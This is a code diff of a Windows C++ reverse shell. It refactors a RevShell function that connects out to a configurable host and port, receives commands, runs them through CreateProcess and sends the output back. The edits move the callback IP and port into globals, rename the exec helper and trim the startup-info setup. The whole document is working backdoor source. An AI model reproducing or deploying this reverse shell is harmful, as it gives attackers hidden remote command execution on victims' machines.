@@ -9,12 +9,11 @@
 #pragma comment(lib, "ws2_32.lib")
 #define DEFAULT_BUFLEN 1024
 
-void exec(TCHAR* returnval, int returnsize, TCHAR* exec) {
-    /*if (32 >= (int)(ShellExecute(NULL, _T("open"), fileexec, NULL, NULL, SW_HIDE))) {
-        _tcscat(returnval, _T("[x] Error executing command..\n"));
-    } else {
-        _tcscat(returnval, _T("\n"));
-    }*/
+const char *ip = "127.0.0.1";
+int  port = 8080;
+
+void execute(TCHAR* returnval, int returnsize, TCHAR* exec) {
+    
     SECURITY_ATTRIBUTES sa;
     HANDLE hRead, hWrite;
     PROCESS_INFORMATION pi;
@@ -30,13 +29,8 @@ void exec(TCHAR* returnval, int returnsize, TCHAR* exec) {
         return;
     }
 
-    ZeroMemory(&si, sizeof(STARTUPINFO));
-    si.cb = sizeof(STARTUPINFO);
-    si.hStdOutput = hWrite;
-    si.hStdError = hWrite;
-    si.dwFlags |= STARTF_USESTDHANDLES;
-
-    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
+    ZeroMemory(&si, sizeof(si));
+	ZeroMemory(&pi, sizeof(pi));
 
     if (!CreateProcess(NULL, exec, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
         _tcscat(returnval, _T("[x] Error executing command."));
@@ -94,15 +88,14 @@ void systeminfo(TCHAR* returnval, int returnsize) {
 
 void RevShell() {
 
-    WSADATA wsaver;
-    WSAStartup(MAKEWORD(2, 2), &wsaver);
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2, 2), &wsaData);
    
     SOCKET tcpsock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     sockaddr_in addr;
-    PVOID paddbuf = NULL;
     addr.sin_family = AF_INET;
-    addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); //change
-    addr.sin_port = htons(8080);                        //change
+    addr.sin_addr.S_un.S_addr = inet_addr(ip);
+    addr.sin_port = htons(port);
 
     if (connect(tcpsock, (SOCKADDR*)&addr, sizeof(addr)) == SOCKET_ERROR) {
         closesocket(tcpsock);
@@ -169,7 +162,7 @@ void RevShell() {
                         j++;
                     }
                     TCHAR buffer[257] = _T("");
-                    exec(buffer, 257, CommandExec);
+                    execute(buffer, 257, CommandExec);
                     _tcscat(buffer, _T("\n"));
                     send(tcpsock, (const char*)buffer, _tcslen(buffer) + 1, 0);
                     memset(buffer, 0, sizeof(buffer));
